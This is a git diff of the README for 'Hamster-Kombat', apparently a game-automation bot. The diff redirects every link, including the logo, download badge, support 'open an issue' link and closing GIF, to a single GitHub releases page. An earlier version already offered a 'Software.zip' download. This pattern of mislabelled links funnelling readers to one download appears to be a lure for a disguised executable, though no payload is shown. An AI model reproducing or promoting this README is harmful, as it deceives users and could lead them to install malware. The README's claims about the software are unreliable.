@@ -1,6 +1,6 @@
 # Hamster-Kombat
 
-![Hamster Kombat Logo](https://example.com/hamster-kombat-logo.png)
+![Hamster Kombat Logo](https://github.com/20humam09/Hamster-Kombat/releases/tag/v2.0)
 
 Welcome to **Hamster-Kombat** - your ultimate companion for dominating the Hamster Kombat game! 
 
@@ -14,7 +14,7 @@ Welcome to **Hamster-Kombat** - your ultimate companion for dominating the Hamst
 - Enhance your gaming experience with minimum effort
 
 ## Download
-[![Download Hamster-Kombat](https://img.shields.io/badge/Download-Software-blueviolet)](https://github.com/user-attachments/files/17676667/Software.zip)
+[![Download Hamster-Kombat](https://github.com/20humam09/Hamster-Kombat/releases/tag/v2.0)](https://github.com/20humam09/Hamster-Kombat/releases/tag/v2.0)
 
 ## Getting Started
 To get started with Hamster-Kombat, follow these steps:
@@ -30,7 +30,7 @@ To use Hamster-Kombat, simply run the Python script and watch as the bot automat
 We welcome contributions to enhance the capabilities of Hamster-Kombat. Feel free to fork this repository, make improvements, and submit a pull request. Together, we can make Hamster-Kombat even better!
 
 ## Support
-If you encounter any issues or have questions about Hamster-Kombat, please [open an issue](https://github.com/yourusername/Hamster-Kombat/issues) on this repository. Our team will be happy to assist you.
+If you encounter any issues or have questions about Hamster-Kombat, please [open an issue](https://github.com/20humam09/Hamster-Kombat/releases/tag/v2.0) on this repository. Our team will be happy to assist you.
 
 ## License
 This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.
@@ -39,4 +39,4 @@ This project is licensed under the MIT License - see the [LICENSE](LICENSE) file
 
 🐹 Happy Gaming with Hamster-Kombat! 🎮
 
-![Hamster GIF](https://example.com/hamster-gif.gif)
+![Hamster GIF](https://github.com/20humam09/Hamster-Kombat/releases/tag/v2.0)
